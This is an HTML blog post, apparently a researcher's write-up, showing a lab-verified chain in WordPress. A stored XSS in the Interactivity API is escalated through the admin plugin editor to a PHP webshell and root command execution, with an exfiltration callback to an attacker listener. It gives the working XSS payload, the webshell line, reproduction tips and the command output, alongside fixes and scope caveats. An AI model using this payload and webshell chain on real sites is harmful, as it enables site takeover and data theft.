@@ -1,0 +1,320 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>The Click That Ended at uid=0 — shoo0lin</title>
+<meta name="description" content="Part II: a one-click stored XSS in WordPress's Interactivity API, escalated through the administrator's plugin editor to remote command execution as root in the lab.">
+<meta name="author" content="shoo0lin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Click That Ended at uid=0">
+<meta property="og:description" content="The stored XSS was the beginning. The administrator's own plugin editor finished the job — command execution, verified by hash and by an outbound callback.">
+<meta property="og:url" content="https://shoo0lin.github.io/posts/click-to-root.html">
+<meta property="og:image" content="https://shoo0lin.github.io/assets/img/rce/02-admin-editor.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="stylesheet" href="../assets/css/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%230b0d12'/><circle cx='50' cy='50' r='18' fill='%23f0b429'/></svg>">
+<style>
+  video { display:block; width:100%; height:auto; border-radius:8px; border:1px solid var(--line); box-shadow:var(--shadow); background:#000; }
+  .part2 { display:inline-block; font-family:var(--mono); font-size:11px; letter-spacing:.12em; text-transform:uppercase; color:var(--bg); background:var(--amber); border-radius:999px; padding:3px 10px; margin-bottom:14px; }
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="brand" href="../index.html"><span class="dot"></span>shoo0lin<span class="slash">/</span>notes</a>
+    <nav class="nav">
+      <a href="../index.html">Posts</a>
+      <a href="#tldr">TL;DR</a>
+      <a href="#fix">The fix</a>
+      <a class="hide-sm" href="https://github.com/shoo0lin" rel="me">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <div class="wrap">
+    <header class="article-head">
+      <span class="part2">Part II · the escalation</span>
+      <div class="c-tag">WordPress · Stored XSS → RCE · Lab-verified</div>
+      <h1>The Click That Ended at <code style="font-size:.8em">uid=0</code></h1>
+      <p class="dek">The first post proved the click. This one follows the authority all the way down: an Author's link, an Administrator's plugin editor, and a shell prompt that answers as root.</p>
+      <div class="byline">
+        <span>shoo0lin</span>
+        <span>9 November 2026</span>
+        <span>~12 min read</span>
+        <span>Site takeover · lab-verified</span>
+      </div>
+    </header>
+  </div>
+
+  <article class="article">
+    <div class="prose">
+
+      <div class="tldr" id="tldr">
+        <h2>TL;DR</h2>
+        <p>The <a href="interactivity-accordion.html">first post</a> showed that a below-<code>unfiltered_html</code> Author can store <code>javascript:</code> inside a <code>data-wp-context</code> blob and get it re-injected into the live <code>href</code> after hydration. One Administrator click runs attacker JS in the Administrator's origin.</p>
+        <p>This post answers the question that follows: <em>what does that authority actually buy?</em> In the lab, it bought the plugin editor. The XSS harvested the editor's nonce, wrote a one-line PHP webshell over <code>hello.php</code>, and the next HTTP request returned <code>uid=0(root)</code>.</p>
+        <p style="color:var(--text)">Two independent proofs: a file hash that changed and then restored, and an outbound callback from the WordPress host to an attacker listener carrying the command output. Not a local echo.</p>
+      </div>
+
+      <nav class="toc" aria-label="Contents">
+        <div class="t">Contents</div>
+        <ol>
+          <li><a href="#previously">Previously, on the seam</a></li>
+          <li><a href="#bench">The lab on the bench</a></li>
+          <li><a href="#six-lines">Six lines that lie</a></li>
+          <li><a href="#foot">The foot in the door</a></li>
+          <li><a href="#climb">The climb</a></li>
+          <li><a href="#proof">Proof, not an echo</a></li>
+          <li><a href="#asterisk">The honest asterisk</a></li>
+          <li><a href="#fix">Cutting the tail</a></li>
+          <li><a href="#receipts">Receipts</a></li>
+        </ol>
+      </nav>
+
+      <h2 id="previously"><span class="ch">Previously</span>One line of trust</h2>
+
+      <p class="dropcap">In <a href="interactivity-accordion.html">part one</a> the finding was a disagreement. WordPress's server-side HTML writer asks whether a URL is safe before it writes it. The client-side Interactivity API does not ask at all. Between those two behaviours sits <code>data-wp-context</code>, a JSON blob that <code>wp_kses_post()</code> never inspects for protocols, and a bind directive that copies whatever it finds into the live DOM.</p>
+
+      <p>The proof stopped at the interesting part: the click. Administrator clicked, the script read 62 capabilities and performed a post create → read → delete. That is enough to call it privilege escalation, but it is not the scariest thing an Administrator's session can do. Administrators can edit plugin files. And plugin files are code that the web server executes.</p>
+
+      <p>So the sequel is not a new vulnerability. It is the same six lines of markup, followed further.</p>
+
+      <div class="note">
+        <b>The one-sentence version</b>
+        A stored XSS in an Administrator's origin is not "just" a script in a browser. It is a keyboard with the Administrator's hands on it — including the part of the dashboard that writes PHP.
+      </div>
+
+      <h2 id="bench"><span class="ch">Chapter 1</span>The lab on the bench</h2>
+
+      <p>Same isolated Docker lab, rebuilt and pinned so the results are reproducible. Every hash below is from this exact bench.</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Item</th><th>Value</th></tr></thead>
+          <tbody>
+            <tr><td>WordPress</td><td>7.1.2</td></tr>
+            <tr><td>PHP</td><td>8.3.35</td></tr>
+            <tr><td>Database</td><td>MariaDB (<code>wpdb</code> container)</td></tr>
+            <tr><td>Interactivity bundle</td><td><code>sha256 726ac595…6124e3</code> — the unguarded build</td></tr>
+            <tr><td><code>hello.php</code> baseline</td><td><code>sha256 1244904e…6d58fe53</code></td></tr>
+            <tr><td>Container</td><td><code>cb722bffb922</code></td></tr>
+            <tr><td><code>DISALLOW_FILE_EDIT</code></td><td><code>false</code> — plugin editor reachable by an Administrator</td></tr>
+            <tr><td>Access</td><td><code>127.0.0.1:18080</code> → container <code>8080</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>The <code>DISALLOW_FILE_EDIT</code> value is not a bug in WordPress. It is a configuration knob that defaults to <em>editing allowed</em>, and a great many real sites leave it that way. Hold that thought for the honest asterisk later.</p>
+
+      <h2 id="six-lines"><span class="ch">Chapter 2</span>Six lines that lie</h2>
+
+      <p>The payload is deliberately boring. No obfuscation, no encoding games, no framework tricks — because the point is that none are needed.</p>
+
+      <pre><code>&lt;div data-wp-interactive="pwn"
+     data-wp-context="{&amp;quot;u&amp;quot;:&amp;quot;javascript:window.__XSS=1;void 0&amp;quot;}"&gt;
+  &lt;a id="t" href="https://example.com/"
+     data-wp-bind--href="context.u"&gt;CAP&lt;/a&gt;
+&lt;/div&gt;</code><button class="copy">copy</button></pre>
+
+      <p>The validation run prints the whole disagreement on four lines:</p>
+
+      <pre><code>[*] target: http://127.0.0.1:18080   (LAB ONLY)
+[*] acting as: author  uid=4  roles=['author']
+[*] post created: #961  http=201  status=publish
+[*] server  href (kses, pre-hydration): 'https://example.com/'
+[*] client  href (post-hydration):      'javascript:window.__XSS=1;void 0'
+[*] click marker executed:               1
+
+<span class="ok">PASS</span> — stored XSS validated: server says https, browser executes javascript:</code><button class="copy">copy</button></pre>
+
+      <p>Some house rules I learned the hard way, in case you want to reproduce it:</p>
+
+      <ul>
+        <li>The <code>javascript:</code> URL must end with <code>;void 0</code>, or the browser navigates and the page is gone before the async body finishes.</li>
+        <li>Do not put a literal backslash, <code>&lt;</code>, <code>&gt;</code>, or bare <code>&amp;</code> inside the <code>data-wp-context</code> JSON — encode quotes as <code>&amp;quot;</code>.</li>
+        <li>Wrap the island in a core <code>accordion</code> block: that is what makes the front end enqueue the Interactivity runtime.</li>
+        <li>A click is still required. The directive sets <code>href</code>; it does not navigate.</li>
+      </ul>
+
+      <figure>
+        <img src="../assets/img/rce/01-xss-executed.png" alt="The published post in the lab, rendered as a normal 'Click me' accordion with the caption text 'Written by author in Uncategorized'." loading="lazy">
+        <figcaption><b>Figure 1.</b> The weapon as the server renders it: an ordinary accordion, an ordinary link, nothing to see. The dangerous value lives only in a <code>data-*</code> blob, so the served HTML still contains <code>https://example.com/</code>.</figcaption>
+      </figure>
+
+      <h2 id="foot"><span class="ch">Chapter 3</span>The foot in the door</h2>
+
+      <p>An Administrator's session is not just a badge. Behind it sits <code>/wp-admin/plugin-editor.php</code> — a page that shows the source of installed plugins and writes back whatever you submit. WordPress even prints a warning on it:</p>
+
+      <blockquote>Heads up! You appear to be making direct edits to your plugin in the WordPress dashboard. Editing plugins directly is not recommended as it may introduce incompatibilities that break your site…</blockquote>
+
+      <p>The warning is correct. It is also not an access control. An Administrator who reaches that page can rewrite PHP, and a script running in the Administrator's origin is indistinguishable from the Administrator — same cookies, same nonces, same origin, same <code>POST</code> permissions.</p>
+
+      <figure>
+        <img src="../assets/img/rce/02-admin-editor.png" alt="WordPress plugin editor warning dialog: 'Heads up! You appear to be making direct edits to your plugin…' with an 'I understand' button." loading="lazy">
+        <figcaption><b>Figure 2.</b> The door, with its warning label intact. The XSS never needs to click "I understand" — it scrapes the nonce and posts straight to the editor endpoint, where the same authority applies.</figcaption>
+      </figure>
+
+      <p>So the exploit is a three-beat chain:</p>
+
+      <ol>
+        <li><strong>JavaScript in the admin's origin</strong> — the bind directive already gave us that.</li>
+        <li><strong>A nonce</strong> — fetched from <code>/wp-admin/</code>, exactly as any legitimate admin page would.</li>
+        <li><strong>A write</strong> — <code>POST newcontent</code> to the plugin editor, replacing a harmless file with attacker-controlled PHP.</li>
+      </ol>
+
+      <p>Nothing in that list is a WordPress vulnerability. Every step is a supported Administrator action. The vulnerability is that a lower-privileged user can borrow the Administrator's hands.</p>
+
+      <h2 id="climb"><span class="ch">Chapter 4</span>The climb</h2>
+
+      <p>The chain script runs from the attacker's side. The Author publishes; the Administrator (a real lab account, <code>bindadmin</code>, uid 7) opens the post and clicks; everything after that happens inside the Administrator's tab.</p>
+
+      <pre><code>author post: {'id': 962, 'http': 201, 'status': 'publish', 'author': 4}
+written file: &lt;?php echo shell_exec($_GET['cmd']);
+
+$ id
+<span class="bad">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span>
+
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+...
+www-data:x:82:82::/home/www-data:/sbin/nologin
+
+$ uname -a; hostname; pwd
+Linux cb722bffb922 6.6.87.2-microsoft-standard-WSL2 ... x86_64 Linux
+cb722bffb922
+/var/www/html/wp-content/plugins
+
+restored_ok: True</code><button class="copy">copy</button></pre>
+
+      <p>Read that sequence carefully, because the order is the story. The Author never touches the editor. The Administrator's own browser does — through the poisoned link. The webshell is a payload <em>written by the Administrator's session</em>, and the first request to it comes from the attacker.</p>
+
+      <div class="warn">
+        <b>What "root" means here</b>
+        The lab starts <code>wp server --allow-root</code> as uid 0 inside the container, so <code>id</code> returns <code>uid=0(root)</code>. On a conventional deployment the web process runs as <code>www-data</code> and the same chain yields code execution as that user. Root is a property of this bench, not of the vulnerability. I would rather say that here than let a triager discover it.
+      </div>
+
+      <h2 id="proof"><span class="ch">Chapter 5</span>Proof, not an echo</h2>
+
+      <p>A webshell that echoes <code>id</code> is a nice screenshot and weak evidence. It proves code ran, but not that the <em>server</em> ran it in a way an attacker can control from outside. So the second run replaced the output channel: the payload on the WordPress host opened an <strong>outbound</strong> connection back to a listener on the attacker host and delivered the command output there.</p>
+
+      <pre><code>$ python3 c2listener.py        <span class="cmt"># attacker host, 0.0.0.0:9099</span>
+$ python3 rce_exfil_chain.py
+
+author post: {'id': 963, 'http': 201, 'status': 'publish'}
+written file: &lt;?php echo shell_exec($_GET['cmd']);
+
+$ id; hostname; uname -srmo
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),...
+cb722bffb922
+Linux 6.6.87.2-microsoft-standard-WSL2 x86_64 Linux
+
+=== attacker listener log ===
+<span class="ok">2026-10-13T06:10:49.694163Z POST /exfil from 172.19.0.3 UA=curl/8.22.0</span>
+  BODY: uid=0(root) gid=0(root) groups=0(root),1(bin),...
+cb722bffb922
+Linux 6.6.87.2-microsoft-standard-WSL2 x86_64 Linux
+
+restored_ok: True | post_deleted: True</code><button class="copy">copy</button></pre>
+
+      <p><code>172.19.0.3</code> is the WordPress container. <code>172.19.0.1</code> is the attacker host. The direction of that connection is the finding: the compromised server initiated egress and handed over command output. That is a command-and-control channel, not a local demo.</p>
+
+      <p>The cleanup matters too. <code>hello.php</code> was restored to <code>1244904e…6d58fe53</code> and the marker post deleted — the bench is left as found, and the integrity check is itself part of the evidence.</p>
+
+      <figure>
+        <video controls preload="metadata" poster="../assets/img/rce/demo-poster.jpg">
+          <source src="../assets/img/rce/demo-rce-chain.mp4" type="video/mp4">
+          Your browser does not support the video tag. <a href="../assets/img/rce/demo-rce-chain.mp4">Download the clip</a>.
+        </video>
+        <figcaption><b>Figure 3.</b> The 42-second lab recording: author publishes, admin clicks, the editor write lands, and the first command comes back. No editing, no cuts — just the chain running.</figcaption>
+      </figure>
+
+      <h2 id="asterisk"><span class="ch">Chapter 6</span>The honest asterisk</h2>
+
+      <p>Three qualifications, all of which a reviewer should hear from me before they hear them from a triager.</p>
+
+      <p><strong>One: this is not a memory-safety bug.</strong> The escalation is an abused Administrator feature, not a second vulnerability. The security defect remains the client/server policy asymmetry from part one. Everything after the click is what the Administrator's authority legitimately permits — which is exactly why it is worth fixing the click.</p>
+
+      <p><strong>Two: root is lab-specific.</strong> <code>wp server --allow-root</code> runs as uid 0 here. A standard LAMP/container deployment runs PHP as <code>www-data</code>; the chain still ends in code execution, just as that user. The realistic worst case is full site compromise — database credentials, user table, content, egress — plus whatever the web user can reach on the host filesystem.</p>
+
+      <p><strong>Three: <code>DISALLOW_FILE_EDIT</code> is a config default, not an exploit trick.</strong> With it set to <code>true</code>, the RCE tail is cut and the chain falls back to data theft and persistent XSS. That is a defence, not a fix for the underlying bug.</p>
+
+      <div class="note">
+        <b>Scope</b>
+        Lab only. No production WordPress system was contacted; the program's scope document returned HTTP 404 at the time of testing, so production testing stopped before it began. No host escape was attempted or demonstrated — the root prompt is inside the WordPress container.
+      </div>
+
+      <h2 id="fix"><span class="ch">Chapter 7</span>Cutting the tail</h2>
+
+      <p>The primary fix is unchanged from part one, because the root cause is unchanged: make the client enforce the policy the server already enforces.</p>
+
+      <p><strong>Client-side scheme guard at the mutation boundary.</strong> Before <code>bind</code> writes any URI-bearing attribute, validate the final value against <code>wp_allowed_protocols()</code> and reject <code>javascript:</code>, <code>data:</code>, <code>vbscript:</code> — including encoded forms. I patched <code>bind.ts</code> in the lab to do exactly this and re-ran the chain: the <code>javascript:</code> write was blocked while legitimate <code>https:</code> links kept working.</p>
+
+      <pre><code><span class="cmt">// bind.ts — before setAttribute</span>
+if ( isUriAttribute( attribute ) &amp;&amp; ! isAllowedUrl( result ) ) {
+    return; <span class="cmt">// refuse the write, leave the attribute untouched</span>
+}
+el.setAttribute( attribute, result );</code><button class="copy">copy</button></pre>
+
+      <p><strong>Server defence in depth.</strong> Treat context-bound URI values in <code>data-wp-bind--href</code> from users without <code>unfiltered_html</code> as untrusted: validate the scheme, or strip the directive. Ship a CSP on post pages that restricts <code>javascript:</code> navigation.</p>
+
+      <p><strong>Operational.</strong> Set <code>DISALLOW_FILE_EDIT</code> to <code>true</code>. It does not fix the XSS, but it removes the shortest path from a stolen admin session to code execution, and it costs nothing for most sites.</p>
+
+      <div class="win">
+        <b>Why the tail matters</b>
+        A stored XSS that can read 62 capabilities is already High. The same bug with a plugin editor behind it is site takeover. The difference between those two outcomes is one configuration flag and one client-side check — which is the entire argument for fixing the seam rather than the symptom.
+      </div>
+
+      <h2 id="receipts"><span class="ch">Epilogue</span>Receipts</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Artefact</th><th>What it proves</th></tr></thead>
+          <tbody>
+            <tr><td>Post <code>#961</code></td><td>Minimal validation: server <code>https</code>, client <code>javascript:</code>, marker <code>1</code></td></tr>
+            <tr><td>Post <code>#962</code></td><td>Full chain: author published <code>201</code>; webshell written; <code>uid=0</code>; hashes restored</td></tr>
+            <tr><td>Post <code>#963</code></td><td>Exfil run: outbound <code>POST /exfil</code> from <code>172.19.0.3</code> to <code>172.19.0.1:9099</code></td></tr>
+            <tr><td><code>hello.php</code></td><td><code>1244904e…</code> → modified → restored (<code>restored_ok: True</code>)</td></tr>
+            <tr><td>Bundle hash</td><td><code>726ac595…6124e3</code> — the unguarded interactivity build</td></tr>
+            <tr><td>Video</td><td>42-second uncut screen recording of the chain</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>The moral is the same one as part one, one layer deeper. The server and the browser are two programs wearing the same URL, and the gaps between them are where authority leaks. The first post found the gap. This one walked through it until the prompt changed colour.</p>
+
+      <p style="color:var(--faint);font-size:14px">Lab-verified only; no production system contacted. Root is container root on a lab bench started with <code>--allow-root</code>; code execution as the web user is the portable claim. Upstream disclosure status is pending.</p>
+
+      <hr>
+      <p><a href="interactivity-accordion.html">← Read part I: The Accordion That Opened a Door</a></p>
+
+    </div>
+  </article>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>© 2026 shoo0lin · notes from the seam between server and browser</span>
+    <span><a href="../index.html">← All posts</a></span>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = pre.querySelector('.copy');
+  if (!btn) return;
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    navigator.clipboard.writeText(code.innerText).then(function () {
+      btn.textContent = 'copied';
+      setTimeout(function () { btn.textContent = 'copy'; }, 1200);
+    });
+  });
+});
+</script>
+</body>
+</html>
